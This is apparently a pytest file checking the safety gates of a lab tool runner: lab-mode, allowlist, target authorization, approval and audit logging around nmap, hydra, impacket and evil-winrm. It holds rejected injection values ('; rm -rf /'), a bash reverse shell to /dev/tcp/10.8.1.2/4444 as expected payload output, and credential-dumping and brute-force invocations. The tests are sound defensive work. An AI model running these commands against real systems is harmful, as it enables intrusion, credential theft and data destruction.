"""Authorized-lab execution: every safety gate must hold before a tool ever runs."""
import types

import pytest

from builder import labtools
from builder.config import Config
from builder.db import Store
from builder.safety import LabModeOff, TargetNotAuthorized


def _setup(tmp_path, authorize=None):
    cfg = Config(home=tmp_path, code_dirs=[str(tmp_path)])
    db = Store(cfg.db_path)
    if authorize:
        db.authorize_lab_target(authorize, "ctf", "owned/practice")
    return cfg, db


def _fake_run(monkeypatch, output="PORT 22 open"):
    monkeypatch.setattr(labtools, "tool_available", lambda t: True)
    def fake(cmd, capture_output, text, timeout):
        return types.SimpleNamespace(stdout=output, stderr="", returncode=0)
    monkeypatch.setattr(labtools.subprocess, "run", fake)


def test_refuses_when_lab_mode_off(tmp_path, monkeypatch):
    _fake_run(monkeypatch)
    cfg, db = _setup(tmp_path)                      # no authorized target -> lab off
    with pytest.raises(LabModeOff):
        labtools.run_tool(cfg, db, "nmap", "10.10.1.1", approve=lambda *a: True)


def test_refuses_tool_not_in_allowlist(tmp_path, monkeypatch):
    _fake_run(monkeypatch)
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    with pytest.raises(labtools.LabToolError):
        labtools.run_tool(cfg, db, "metasploit", "10.10.1.1", approve=lambda *a: True)


def test_refuses_unsafe_args_and_other_hosts(tmp_path, monkeypatch):
    _fake_run(monkeypatch)
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    with pytest.raises(labtools.LabToolError):          # shell metacharacter
        labtools.run_tool(cfg, db, "nmap", "10.10.1.1", args=["; rm -rf /"], approve=lambda *a: True)
    with pytest.raises(labtools.LabToolError):          # a different host in args
        labtools.run_tool(cfg, db, "nmap", "10.10.1.1", args=["8.8.8.8"], approve=lambda *a: True)


def test_refuses_target_not_authorized(tmp_path, monkeypatch):
    _fake_run(monkeypatch)
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    with pytest.raises(TargetNotAuthorized):
        labtools.run_tool(cfg, db, "nmap", "9.9.9.9", approve=lambda *a: True)   # different (unauthorized) target


def test_refuses_when_not_approved(tmp_path, monkeypatch):
    from builder.safety import ApprovalRequired
    _fake_run(monkeypatch)
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    with pytest.raises(ApprovalRequired):
        labtools.run_tool(cfg, db, "nmap", "10.10.1.1", approve=lambda *a: False)   # user says no


def test_runs_and_logs_when_everything_passes(tmp_path, monkeypatch):
    _fake_run(monkeypatch, output="22/tcp open ssh")
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    result = labtools.run_tool(cfg, db, "nmap", "10.10.1.1", args=["-sV"], approve=lambda *a: True)
    assert "ssh" in result["output"]
    assert result["cmd"] == ["nmap", "-sV", "10.10.1.1"]          # target is always appended last
    assert any(e["action"] == "offense" and e["decision"] in ("approved", "allowed")
               for e in db.safety_events(10))                     # it's in the audit log


def _fake_local(monkeypatch, output="done"):
    monkeypatch.setattr(labtools, "tool_available", lambda t: True)
    monkeypatch.setattr(labtools.subprocess, "run",
                        lambda cmd, capture_output, text, timeout: types.SimpleNamespace(stdout=output, stderr="", returncode=0))


def test_exploit_tool_runs_through_the_same_target_gates(tmp_path, monkeypatch):
    _fake_run(monkeypatch, output="login found")
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    # hydra is an exploit tool; still aimed only at the authorized target and approved
    result = labtools.run_tool(cfg, db, "hydra", "10.10.1.1", args=["-l", "admin", "-P", "words.txt", "ssh"],
                               approve=lambda *a: True)
    assert result["cmd"][-1] == "10.10.1.1"
    with pytest.raises(TargetNotAuthorized):
        labtools.run_tool(cfg, db, "hydra", "9.9.9.9", approve=lambda *a: True)


def test_local_tool_gates(tmp_path, monkeypatch):
    from builder.safety import ApprovalRequired
    _fake_local(monkeypatch)
    cfg, db = _setup(tmp_path)                       # lab OFF
    with pytest.raises(LabModeOff):
        labtools.run_local_tool(cfg, db, "searchsploit", ["apache"], approve=lambda *a: True)
    cfg, db = _setup(tmp_path, authorize="box")      # lab ON
    with pytest.raises(labtools.LabToolError):       # not in local allowlist
        labtools.run_local_tool(cfg, db, "rm", ["-rf"], approve=lambda *a: True)
    with pytest.raises(labtools.LabToolError):       # shell metacharacter
        labtools.run_local_tool(cfg, db, "searchsploit", ["x; rm -rf /"], approve=lambda *a: True)
    with pytest.raises(ApprovalRequired):            # not approved
        labtools.run_local_tool(cfg, db, "searchsploit", ["apache"], approve=lambda *a: False)
    out = labtools.run_local_tool(cfg, db, "searchsploit", ["apache"], approve=lambda *a: True)
    assert out["output"] == "done"


def test_payload_generation_is_lab_gated(tmp_path):
    cfg, db = _setup(tmp_path)                        # lab OFF
    with pytest.raises(LabModeOff):
        labtools.make_payload(cfg, db, "10.8.1.2", 4444, "bash")
    cfg, db = _setup(tmp_path, authorize="box")       # lab ON
    with pytest.raises(labtools.LabToolError):
        labtools.make_payload(cfg, db, "10.8.1.2", 4444, "nonsense")
    p = labtools.make_payload(cfg, db, "10.8.1.2", 4444, "bash")
    assert p == "bash -i >& /dev/tcp/10.8.1.2/4444 0>&1"
    assert any(e["action"] == "offense" for e in db.safety_events(5))


def _fake_flex(monkeypatch, output="ok"):
    monkeypatch.setattr(labtools, "tool_available", lambda t: True)
    calls = {}
    def fake(cmd, *a, **k):
        calls["cmd"] = cmd
        calls["captured"] = k.get("capture_output", False)
        return types.SimpleNamespace(stdout=output, stderr="", returncode=0)
    monkeypatch.setattr(labtools.subprocess, "run", fake)
    return calls


def test_connection_string_target_not_reappended(tmp_path, monkeypatch):
    calls = _fake_flex(monkeypatch)
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    # impacket uses 'domain/user:pass@target' — target already present, so it must NOT be appended again
    r = labtools.run_tool(cfg, db, "impacket-secretsdump", "10.10.1.1",
                          args=["corp/bob:pass@10.10.1.1"], approve=lambda *a: True)
    assert r["cmd"] == ["impacket-secretsdump", "corp/bob:pass@10.10.1.1"]


def test_interactive_tool_runs_attached_not_captured(tmp_path, monkeypatch):
    calls = _fake_flex(monkeypatch)
    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
    r = labtools.run_tool(cfg, db, "evil-winrm", "10.10.1.1", args=["-u", "admin", "-p", "pw", "-i"],
                          approve=lambda *a: True)
    assert r["output"] == "(interactive session ended)"
    assert calls["captured"] is False               # attached to the terminal, not captured


def test_new_windows_ad_tools_are_allowlisted():
    for t in ("evil-winrm", "netexec", "impacket-GetNPUsers", "impacket-psexec", "bloodhound-python",
              "ldapsearch", "kerbrute", "nuclei", "ssh"):
        assert t in labtools.TOOLS, t
